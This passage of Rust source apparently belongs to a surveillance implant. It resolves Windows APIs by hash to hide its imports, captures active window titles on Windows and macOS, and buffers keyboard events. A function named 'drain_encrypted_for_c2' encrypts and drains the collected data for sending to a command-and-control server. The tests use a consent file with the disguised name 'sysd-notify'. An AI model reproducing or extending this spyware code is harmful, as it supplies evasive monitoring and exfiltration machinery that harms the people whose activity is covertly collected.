    unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
        let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
            Some(m) => m,
            None => {
                let load_fn: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
                    resolve_api(
                        pe_resolve::HASH_KERNEL32_DLL,
                        hash_str_const(b"LoadLibraryW\0"),
                    )?;
                let m = load_fn(dll_wide.as_ptr()) as usize;
                if m == 0 {
                    return None;
                }
                m
            }
        };
        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
        Some(std::mem::transmute_copy(&addr))
    }
    unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
        let module = pe_resolve::get_module_handle_by_hash(dll_hash)?;
        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)?;
        Some(std::mem::transmute_copy(&addr))
    }

    const USER32_DLL_W: &[u16] = &[
        'u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16,
        'd' as u16, 'l' as u16, 'l' as u16, 0,
    ];
    const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
    const HASH_GETFOREGROUNDWINDOW: u32 = hash_str_const(b"GetForegroundWindow\0");
    const HASH_GETWINDOWTEXTW: u32 = hash_str_const(b"GetWindowTextW\0");

    type FnGetForegroundWindow = unsafe extern "system" fn() -> *mut std::ffi::c_void;
    type FnGetWindowTextW = unsafe extern "system" fn(*mut std::ffi::c_void, *mut u16, i32) -> i32;

    unsafe {
        let get_fg: FnGetForegroundWindow =
            resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETFOREGROUNDWINDOW)
                .ok_or("GetForegroundWindow not found")?;
        let get_wtext: FnGetWindowTextW =
            resolve_api(HASH_USER32_DLL, HASH_GETWINDOWTEXTW).ok_or("GetWindowTextW not found")?;

        let hwnd = get_fg();
        if hwnd.is_null() {
            return Err("No foreground window found".to_string());
        }

        let mut buffer: [u16; 256] = [0; 256];
        let len = get_wtext(hwnd, buffer.as_mut_ptr(), buffer.len() as i32);

        if len > 0 {
            Ok(OsString::from_wide(&buffer[..len as usize])
                .to_string_lossy()
                .into_owned())
        } else {
            Err("Could not get window title".to_string())
        }
    }
}

#[cfg(target_os = "macos")]
fn get_active_window_title() -> Result<String, String> {
    use std::process::Command;
    // Use AppleScript via `osascript` to retrieve the frontmost application
    // name.  This requires no additional crate dependencies and works on all
    // modern macOS versions without accessibility permissions.
    let output = Command::new("osascript")
        .args([
            "-e",
            "tell application \"System Events\" to get name of first process whose frontmost is true",
        ])
        .output()
        .map_err(|e| e.to_string())?;
    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).to_string())
    }
}

#[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
fn get_active_window_title() -> Result<String, String> {
    Err("Active window title not supported on this platform".to_string())
}

// ── 5.6: Retention policy ─────────────────────────────────────────────────────

/// Remove all events from the buffer whose timestamp is older than
/// `MAX_RETENTION_SECONDS`.  Call periodically (e.g., once per flush cycle)
/// to bound memory usage over long-running sessions.
pub fn purge_expired_events() {
    let cutoff =
        (Utc::now().timestamp_micros() as u64).saturating_sub(MAX_RETENTION_SECONDS * 1_000_000);
    let mut buf = HCI_LOG_BUFFER.lock_recover();
    buf.retain(|ev| {
        let ts = match ev {
            HciEvent::Keyboard(k) => k.timestamp,
            HciEvent::Window(w) => w.timestamp,
        };
        ts >= cutoff
    });
}

// ── 5.6: Search / sensitive window filtering ─────────────────────────────────

/// Returns `true` when `title` matches one of the sensitive-context filters
/// and buffering of HCI events should be suppressed.
pub fn is_sensitive_window(title: &str) -> bool {
    let lower = title.to_lowercase();
    SENSITIVE_WINDOW_FILTERS.iter().any(|kw| lower.contains(kw))
}

// ── 5.6: Encrypted exfiltration drain ────────────────────────────────────────

/// Serialise and encrypt the current event buffer for transmission to C2.
///
/// Returns the encrypted bytes (ChaCha20-Poly1305 with a one-shot nonce) and
/// clears the in-memory buffer.  Returns `None` when the buffer is empty.
///
/// The caller is responsible for actually sending the ciphertext — this
/// function only handles serialisation, encryption, and buffer draining.
pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
    use chacha20poly1305::{
        aead::{Aead, KeyInit},
        ChaCha20Poly1305, Nonce,
    };
    let events: Vec<HciEvent> = {
        let mut buf = HCI_LOG_BUFFER.lock_recover();
        if buf.is_empty() {
            return None;
        }
        buf.drain(..).collect()
    };
    let plaintext = match serde_json::to_vec(&events) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!("hci_logging: serialisation failed: {}", e);
            return None;
        }
    };
    let cipher = ChaCha20Poly1305::new(key.into());
    // Use a random 12-byte nonce and prepend it to the ciphertext so the
    // receiver can reconstruct the nonce without out-of-band signalling.
    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);
    match cipher.encrypt(nonce, plaintext.as_slice()) {
        Ok(mut ct) => {
            let mut out = nonce_bytes.to_vec();
            out.append(&mut ct);
            Some(out)
        }
        Err(e) => {
            tracing::error!("hci_logging: encryption failed: {}", e);
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;
    use tempfile::tempdir;

    // Helper to create the consent file for testing
    fn create_consent_file(path: &Path) {
        fs::write(path, "consent").unwrap();
    }

    // Helper to remove the consent file after testing
    fn remove_consent_file(path: &Path) {
        let _ = fs::remove_file(path);
    }

    #[tokio::test]
    async fn test_start_stop_logging() {
        let dir = tempdir().unwrap();
        let consent_file = dir.path().join("sysd-notify");
        let original_path = {
            let mut path_guard = CONSENT_FILE_PATH.lock_recover();
            let original = path_guard.clone();
            *path_guard = consent_file.to_str().unwrap().to_string();
            original
        };

        create_consent_file(&consent_file);
        if let Err(e) = start_logging() {
            println!("Could not start logging, skipping test: {}", e);
            // Restore original path
            *CONSENT_FILE_PATH.lock_recover() = original_path;
            return;
        }
        assert!(start_logging().is_err()); // Already running
        assert!(stop_logging().is_ok());
        assert!(stop_logging().is_err()); // Already stopped
        remove_consent_file(&consent_file);
        assert!(start_logging().is_err()); // No consent

        // Restore original path
        *CONSENT_FILE_PATH.lock_recover() = original_path;
    }

    #[tokio::test]
    async fn test_event_collection() {
        let dir = tempdir().unwrap();
        let consent_file = dir.path().join("sysd-notify");
        let original_path = {
            let mut path_guard = CONSENT_FILE_PATH.lock_recover();
            let original = path_guard.clone();
            *path_guard = consent_file.to_str().unwrap().to_string();
            original
        };

        create_consent_file(&consent_file);
        // Clear buffer from previous runs
        HCI_LOG_BUFFER.lock_recover().clear();

        if let Err(e) = start_logging() {
            println!("Could not start logging, skipping test: {}", e);
            // Restore original path
            *CONSENT_FILE_PATH.lock_recover() = original_path;
            return;
        }

        // Allow some time for the logger to initialize
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Key simulation was previously done via rdev::simulate which has been
        // removed.  The listener is now platform-specific; we test it by
        // injecting events directly into the buffer rather than simulating
        // physical key presses.
        add_log_event(
            &HCI_LOG_BUFFER,
            HciEvent::Keyboard(KeyEvent {
                timestamp: Utc::now().timestamp_micros() as u64,
                pressed: true,
            }),
        );
        add_log_event(
            &HCI_LOG_BUFFER,
            HciEvent::Keyboard(KeyEvent {
                timestamp: Utc::now().timestamp_micros() as u64,
                pressed: false,
            }),
        );

        // Allow time for window title polling
        tokio::time::sleep(Duration::from_secs(2)).await;

        stop_logging().unwrap();

        let buffer = get_log_buffer().unwrap();

        // We expect at least 1 window event if xdotool is available.
        let xdotool_available = std::process::Command::new("xdotool")
            .arg("--version")
            .output()
            .is_ok();
        if xdotool_available {
            let window_events_found = buffer
                .iter()
                .filter(|e| matches!(e, HciEvent::Window(_)))
                .count();
            assert!(
                window_events_found >= 1,
                "No window events found, but xdotool seems to be available."
            );
        } else {
            println!("xdotool not found, skipping window event check.");
        }

        // Restore original path
        *CONSENT_FILE_PATH.lock_recover() = original_path;
    }

    #[test]
    fn test_log_buffer_size_limit() {
        let buffer_handle = Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE)));
        for i in 0..(MAX_BUFFER_SIZE + 10) {
            add_log_event(
                &buffer_handle,
                HciEvent::Keyboard(KeyEvent {
                    timestamp: i as u64,
                    pressed: true,
                }),
            );
        }
        let buffer = buffer_handle.lock_recover();
        assert_eq!(buffer.len(), MAX_BUFFER_SIZE);
    }
}
